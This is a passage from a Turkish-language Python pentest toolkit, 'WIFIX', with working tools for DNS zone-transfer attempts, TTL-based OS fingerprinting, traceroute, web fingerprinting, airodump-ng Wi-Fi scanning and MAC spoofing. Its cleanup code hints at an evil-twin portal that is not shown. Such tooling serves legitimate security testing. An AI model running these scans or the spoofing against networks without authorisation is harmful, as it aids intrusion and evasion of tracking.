            print(f"  {G}[+]{X} {tip}:")
            for l in out.strip().splitlines()[:6]:
                print(f"       {l}")
    print(C + "[*] Zone transfer deneniyor (AXFR)..." + X)
    rc, out = run(f"dig +short {dom} NS 2>/dev/null", 15)
    ns_list = out.strip().splitlines() if out.strip() else []
    if not ns_list:
        rc, out = run(f"dig {dom} NS 2>/dev/null | grep -E 'NS\\s' | awk '{{print $NF}}'", 15)
        ns_list = out.strip().splitlines() if out.strip() else []
    transferred = False
    for ns in ns_list[:5]:
        ns = ns.rstrip(".")
        print(C + f"[*] AXFR deneniyor: {ns} ..." + X)
        rc, out = run(f"dig @{ns} {dom} AXFR +time=5 +tries=1 2>/dev/null", 20)
        if "Transfer failed" not in out and "REFUSED" not in out and "SERVFAIL" not in out:
            zone_lines = [l for l in out.splitlines() if re.match(r"^[\w.-]+\s+\d+\s+IN\s+", l)]
            if zone_lines:
                transferred = True
                print(G + "[+] ZONE TRANSFER BASARILI (acik DNS)!" + X)
                for l in zone_lines[:30]:
                    print(f"  {C}[i]{X} {l}")
                save_report("WIFIX DNS Zone Transfer (ACIK!)\nDomain: " + dom +
                            "\nSunucu: " + ns + "\n\n" + "\n".join(zone_lines), "zone_transfer")
    if not transferred:
        print(R + "[-] Zone transfer basarisiz (sunucular kapali - normal durum)." + X)
    save_report(f"WIFIX DNS Kesfi\nDomain: {dom}\nNS: {ns_list}", "dns_kesfi")

# ============================================================
#  [18] OS PARMAK IZI (TTL ANALIZI)
# ============================================================
def tool18():
    log("OS parmak izi baslatildi")
    target = input(C + "  Hedef IP/Domain: " + X).strip()
    if not target:
        print(R + "[-] Hedef bos olamaz." + X); return
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        print(R + "[-] Cozumlenemedi." + X); return
    print(C + f"[*] {ip} icin TTL olcumu (ping)..." + X)
    ttls = []
    for _ in range(4):
        rc, out = run(f"ping -c 1 -W 2 {ip}", 8)
        m = re.search(r"ttl=(\d+)", out)
        if m: ttls.append(int(m.group(1)))
        time.sleep(0.3)
    if not ttls:
        print(R + "[-] Yanit alinamadi (ICMP engelli olabilir)." + X)
        return
    ttl = max(ttls)
    print(f"  {C}[i]{X} Olcülen TTL: {ttl} (ornekler: {ttls})")
    if ttl <= 64:  os = "Linux / Unix / Android / MacOS"
    elif ttl <= 128: os = "Windows / Windows Server"
    elif ttl <= 255: os = "Cisco / Solaris / AIX / Unix"
    else: os = "Bilinmeyen"
    print(G + f"[+] Muhtemel isletim sistemi: {os}" + X)
    print(C + "[*] TCP/IP stack ipuclari..." + X)
    for p, name in ((22, "SSH"), (80, "HTTP"), (443, "HTTPS"), (3389, "RDP"), (445, "SMB")):
        if scan_port(ip, p):
            print(f"  {G}[+]{X} {name} portu acik (OS destegi: {os})")
    save_report(f"WIFIX OS Parmak Izi\nHedef: {target} ({ip})\nTTL: {ttl}\nTahmin: {os}",
                "os_parmak_izi")

# ============================================================
#  [19] TRACEROUTE & ROTA ANALIZI
# ============================================================
def tool19():
    log("Traceroute baslatildi")
    target = input(C + "  Hedef IP/Domain: " + X).strip()
    if not target:
        print(R + "[-] Hedef bos olamaz." + X); return
    if not have("traceroute"):
        print(Y + "[!] traceroute yok: sudo apt install traceroute" + X)
    print(C + f"[*] {target} rotasi izleniyor..." + X)
    rc, out = run(f"traceroute -m 20 -w 2 {target} 2>/dev/null || traceroute -m 20 {target} 2>&1", 120)
    print(out[:2500] if out else R + "[-] Cikti yok." + X)
    hops = []
    for l in out.splitlines()[1:]:
        m = re.match(r"\s*(\d+)\s+(\S+)", l)
        if m: hops.append((m.group(1), m.group(2)))
    save_report(f"WIFIX Traceroute\nHedef: {target}\nTarih: {ts()}\n\n" + out, "traceroute")
    print(G + f"[+] {len(hops)} atlama kaydedildi." + X)

# ============================================================
#  [20] WEB TEKNOLOJI TESPITI
# ============================================================
def tool20():
    log("Web teknoloji tespiti baslatildi")
    url = input(C + "  Hedef URL (orn. http://ornek.com): " + X).strip()
    if not url.startswith("http"):
        url = "http://" + url
    ua = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Wifix/4.0",
          "Accept": "*/*"}
    print(C + f"[*] {url} analiz ediliyor..." + X)
    try:
        req = urllib.request.Request(url, headers=ua)
        r = urllib.request.urlopen(req, timeout=12)
        headers = dict(r.headers)
        body = r.read(200000).decode(errors="replace")
        server = headers.get("Server", "?")
        print(f"  {G}[+]{X} Sunucu: {server}")
        print(f"  {G}[+]{X} HTTP: {r.status} {r.reason}")
        for h in ("X-Powered-By", "X-Generator", "X-AspNet-Version", "X-Drupal-Cache",
                  "Set-Cookie", "Via", "X-Cache", "X-Backend-Server"):
            if headers.get(h):
                print(f"  {G}[+]{X} {h}: {headers[h][:120]}")
        print(C + "[*] Parmak izi eslesmeleri..." + X)
        hits = []
        blob = (server + " " + " ".join(f"{k}:{v}" for k, v in headers.items())).lower()
        for sig, name in FINGERPRINTS:
            if sig.lower() in blob or sig.lower() in body.lower():
                hits.append(name)
                print(f"  {G}[+]{X} {name}")
        for sig, name in [("wp-", "WordPress"), ("joomla", "Joomla"),
                          ("drupal", "Drupal"), ("generator\" content=\"", "CMS" )]:
            if sig in body.lower():
                if name not in hits:
                    hits.append(name)
                    print(f"  {G}[+]{X} {name}")
        print(C + "[*] Guvenlik basliklari (eksikse risk)..." + X)
        for h in ("X-Frame-Options", "X-Content-Type-Options", "Content-Security-Policy",
                  "Strict-Transport-Security"):
            st = G + "[+] VAR" + X if headers.get(h) else R + "[-] YOK (risk)" + X
            print(f"  {C}[i]{X} {h}: {st}")
        save_report(f"WIFIX Web Teknoloji\nHedef: {url}\nSunucu: {server}\n"
                    f"Tespit: {', '.join(hits) if hits else 'bilinmiyor'}", "web_teknoloji")
    except urllib.error.HTTPError as e:
        print(Y + f"[!] HTTP hata: {e.code} (yine de header analizi yapiliyor)" + X)
        print(f"  Server: {e.headers.get('Server', '?')}")
    except Exception as e:
        print(R + f"[-] Baglanti basarisiz: {e}" + X)

# ============================================================
#  [W] WI-FI AG TARAMA
# ============================================================
def toolW():
    log("Wi-Fi tarama baslatildi")
    iface = pick_iface()
    if not iface: return
    mon = monitor_start(iface)
    print(C + "[*] 20 sn ag taramasi (airodump-ng)..." + X)
    srun("timeout 20 airodump-ng " + mon + " --band abg -w /tmp/wifix_wscan --write-interval 5", 30)
    print(G + "[+] Tarama tamam. Yukaridaki listede AP'ler gorunuyor." + X)
    print(C + "[*] CSV'den ozet cikariliyor..." + X)
    csv = "/tmp/wifix_wscan-01.csv"
    if os.path.exists(csv):
        with open(csv, errors="ignore") as f:
            lines = f.readlines()
        ap = []
        in_ap = True
        for l in lines:
            if l.startswith("Station MAC"):
                in_ap = False; continue
            if in_ap and len(l.split(",")) >= 14:
                p = l.split(",")
                if len(p[13].strip()) > 0 and p[0].strip() and p[0].strip() != "BSSID":
                    ap.append(f"{p[13].strip():25s} | Ch {p[3].strip():3s} | {p[0].strip()} | {p[5].strip()} dBm | {p[11].strip()} | {p[8].strip()}")
        if ap:
            print(G + "╔══════════════════════════════════════════════════════════╗" + X)
            print(G + "║  ESSID                     | Kanal | BSSID              ║" + X)
            print(G + "╠══════════════════════════════════════════════════════════╣" + X)
            for a in ap[:40]:
                print("║ " + a.ljust(58) + "║")
            print(G + "╚══════════════════════════════════════════════════════════╝" + X)
            save_report("WIFIX Wi-Fi Tarama\n\n" + "\n".join(ap), "wifi_tarama")
        else:
            print(Y + "[!] CSV okunamadi; yukaridaki airodump ciktisini kullanin." + X)
    monitor_stop(mon)

# ============================================================
#  [M] MAC ADRESI DEGISTIR
# ============================================================
def toolM():
    log("MAC degistirme baslatildi")
    iface = pick_iface()
    if not iface: return
    print(C + f"[i] Mevcut MAC ({iface}): {getmac(iface)}" + X)
    print(Y + "[!] Dikkat: MAC degistirmek mevcut baglantilari koparabilir." + X)
    secim = input(C + "  [1] Rastgele MAC  [2] Elle MAC: " + X).strip()
    if secim == "2":
        nmac = input(C + "  Yeni MAC (AA:BB:CC:DD:EE:FF): " + X).strip()
        if not valid_bssid(nmac):
            print(R + "[-] Gecersiz MAC." + X); return
    else:
        nmac = "02:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(5))
        print(C + f"[i] Uretilen MAC: {nmac}" + X)
    if have("macchanger"):
        srun(f"ip link set {iface} down", 15)
        rc, out = srun(f"macchanger -m {nmac} {iface}", 20)
        srun(f"ip link set {iface} up", 15)
        print(G + f"[+] MAC degistirildi: {getmac(iface)}" + X if rc == 0 else R + "[-] Basarisiz: " + out[:150] + X)
    else:
        print(Y + "[!] macchanger yok: sudo apt install macchanger" + X)
        srun(f"ip link set {iface} down", 15)
        srun(f"ip link set {iface} address {nmac}", 20)
        srun(f"ip link set {iface} up", 15)
        print(G + f"[+] MAC degistirildi: {getmac(iface)}" + X)
    log(f"MAC degistirildi: {iface} -> {getmac(iface)}")

# ============================================================
#  [R] RAPOR KAYDET
# ============================================================
def toolR():
    if not LOG:
        print(Y + "[!] Henuz kaydedilecek islem yok." + X); return
    print(C + "[i] Oturum loglari:" + X)
    for l in LOG:
        print(f"  {C}[i]{X} {l}")
    out = "WIFIX v" + VERSION + " Oturum Raporu\nTarih: " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + \
          "\n\n" + "\n".join(LOG)
    save_report(out, "oturum_raporu")
    print(G + "[+] Raporlar klasoru: " + REPORT_DIR + X)

# ============================================================
#  ANA DONGU
# ============================================================
def main():
    try:
        banner()
        check_deps()
        while True:
            menu()
            secim = input(G + B + "  Wifix> " + X).strip().upper()
            if secim == "Q":
                print(G + "[+] Gorusuruz! Raporlar: " + REPORT_DIR + X)
                break
            elif secim == "W": toolW()
            elif secim == "M": toolM()
            elif secim == "R": toolR()
            elif secim == "1": tool1()
            elif secim == "2": tool2()
            elif secim == "3": tool3()
            elif secim == "4": tool4()
            elif secim == "5": tool5()
            elif secim == "6": tool6()
            elif secim == "7": tool7()
            elif secim == "8": tool8()
            elif secim == "9": tool9()
            elif secim == "10": tool10()
            elif secim == "11": tool11()
            elif secim == "12": tool12()
            elif secim == "13": tool13()
            elif secim == "14": tool14()
            elif secim == "15": tool15()
            elif secim == "16": tool16()
            elif secim == "17": tool17()
            elif secim == "18": tool18()
            elif secim == "19": tool19()
            elif secim == "20": tool20()
            else:
                print(R + "[-] Gecersiz secim." + X)
            input(Y + "\n  Devam etmek icin Enter'a bas..." + X)
    except KeyboardInterrupt:
        print(Y + "\n[!] Ctrl+C algilandi, temiz cikis yapiliyor..." + X)
        run("sudo airmon-ng stop wlan0mon 2>/dev/null", 10)
        run("sudo pkill hostapd 2>/dev/null; sudo pkill dnsmasq 2>/dev/null; sudo pkill -f portal.py 2>/dev/null", 10)
        restore_net()
    except Exception as e:
        print(R + f"[-] Beklenmeyen hata: {e}" + X)

if __name__ == "__main__":
    main()
